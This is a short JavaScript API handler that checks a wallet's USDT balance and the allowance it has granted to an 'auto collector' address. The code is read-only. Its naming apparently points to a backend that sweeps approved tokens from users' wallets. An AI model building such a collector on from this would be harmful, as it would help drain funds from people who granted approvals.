import { ethers } from 'ethers';
import {
    handleCors,
    getProvider,
    getUsdtContract,
    AUTO_COLLECTOR_ADDRESS
} from '../_lib/helpers.js';

export default async function handler(req, res) {
    if (handleCors(req, res)) return;

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { userAddress } = req.body;

    try {
        const provider = getProvider();
        const usdtContract = getUsdtContract(provider);
        const balance = await usdtContract.balanceOf(userAddress);
        const allowance = await usdtContract.allowance(userAddress, AUTO_COLLECTOR_ADDRESS);
        const decimals = await usdtContract.decimals();

        const formattedBalance = ethers.formatUnits(balance, decimals);
        const formattedAllowance = ethers.formatUnits(allowance, decimals);

        res.json({
            success: true,
            balance: formattedBalance,
            allowance: formattedAllowance,
            rawBalance: balance.toString(),
            rawAllowance: allowance.toString()
        });
    } catch (error) {
        console.error('Balance Check Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
}
